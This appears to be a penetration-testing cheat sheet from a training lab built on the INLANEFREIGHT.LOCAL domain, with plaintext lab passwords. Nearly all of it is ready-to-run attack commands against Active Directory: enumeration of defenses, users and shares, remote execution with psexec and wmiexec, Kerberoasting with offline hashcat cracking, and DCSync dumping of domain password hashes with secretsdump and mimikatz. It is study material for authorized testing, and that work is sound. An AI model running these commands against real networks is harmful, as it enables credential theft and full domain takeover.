### **Enumerating Security Controls**
1. Checking the Status of Defender with Get-MpComputerStatus: `Get-MpComputerStatus`
2. Using Get-AppLockerPolicy cmdlet: `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
3. PowerShell Constrained Language Mode: `$ExecutionContext.SessionState.LanguageMode`
4. Using Find-LAPSDelegatedGroups: `Find-LAPSDelegatedGroups`
5. Using Find-AdmPwdExtendedRights: `Find-AdmPwdExtendedRights`
6. Using Get-LAPSComputers: `Get-LAPSComputers`
### **Credentialed Enumeration - from Linux**
1. CME - Domain User Enumeration: `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users`
2. CME - Domain Group Enumeration: `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups`
3. CME - Logged On Users: `sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users`
4. CME Share Searching: `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares`
5. The module spider_plus will dig through each readable share on the host and list all readable files: `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'` When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>.
6. SMBMap To Check Access: `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`
7. Smbmap - Recursive List Of All Directories: `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only`
8. SMB NULL Session with rpcclient: `rpcclient -U "" -N 172.16.5.5`
9. To connect to a host with psexec.py, we need credentials for a user with local administrator privileges: `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125 `
10. Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation: `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 `
11. Windapsearch - Domain Admins: `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da`
12. Windapsearch - Privileged Users: `python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU`
13. Executing BloodHound.py: `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`
### **Credentialed Enumeration - from Windows**
1. Load ActiveDirectory Module: `Import-Module ActiveDirectory`
2. Get Domain Info: `Get-ADDomain`
3. Get-ADUser: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
4. Checking For Trust Relationships: `Get-ADTrust -Filter *`
5. Group Enumeration: `Get-ADGroup -Filter * | select name`
6. Detailed Group Info: `Get-ADGroup -Identity "Backup Operators"`
7. Group Membership: `Get-ADGroupMember -Identity "Backup Operators"`
8. Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment: `Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`
9. SharpHound: `.\SharpHound.exe -c All --zipfilename ILFREIGHT`
## **Kerberoasting - from Linux**
1. Listing SPN Accounts with GetUserSPNs.py: `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`
2. Requesting all TGS Tickets: `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request `
3. Requesting a Single TGS ticket: `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`
4. Saving the TGS Ticket to an Output File: `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`
5. Cracking the Ticket Offline with Hashcat: `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt`
## **Kerberoasting - from Windows**
#### **Kerberoasting - Semi Manual method**
1. Enumerating SPNs with setspn.exe: `setspn.exe -Q */*`
2. Targeting a Single User:
    1. `Add-Type -AssemblyName System.IdentityModel`
    2. `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
3. Retrieving All Tickets Using setspn.exe: `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`
4. Extracting Tickets from Memory with Mimikatz:
    1. `mimikatz # base64 /out:true`
    2. `mimikatz # kerberos::list /export`
5. Preparing the Base64 Blob for Cracking: `echo "<base64 blob>" |  tr -d \\n`
6. Placing the Output into a File as .kirbi: `cat encoded_file | base64 -d > sqldev.kirbi`
7. Extracting the Kerberos Ticket using kirbi2john.py: `python2.7 kirbi2john.py sqldev.kirbi`
8. Modifiying crack_file for Hashcat: `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`
9. Cracking the Hash with Hashcat: `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`
#### **Kerberoasting - Automated / Tool Based Route**
1. Using PowerView to Extract TGS Tickets: `Get-DomainUser * -spn | select samaccountname`
2. Using PowerView to Target a Specific User: `Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`
3. Exporting All Tickets to a CSV File: `Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation`
4. Viewing the Contents of the .CSV File: `cat .\ilfreight_tgs.csv`
#### **Kerberoasting with Rubeus**
1. Using the /stats Flag: `.\Rubeus.exe kerberoast /stats`
2. Using the /nowrap Flag: `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`
3. creating an SPN account named testspn and using Rubeus to Kerberoast this specific user to test this out: `.\Rubeus.exe kerberoast /user:testspn /nowrap`
4. Checking with PowerView: `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`
5. Use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket: `.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap`
## **DCSync**
1. Using Get-DomainUser to View user Group Membership: `Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl`
2. Using Get-ObjectAcl to Check adunn's Replication Rights:
    1.  `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"`
    2. `Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl`
3. Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py: `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5`
4. Enumerating Further using Get-ADUser: `Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl`
5. Checking for Reversible Encryption Option using Get-DomainUser: `Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontro`
6. Using runas.exe: `runas /netonly /user:INLANEFREIGHT\adunn powershell`
7. Performing the Attack with Mimikatz:
    1. `.\mimikatz.exe`
    2. `privilege::debug`
    3. `lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator`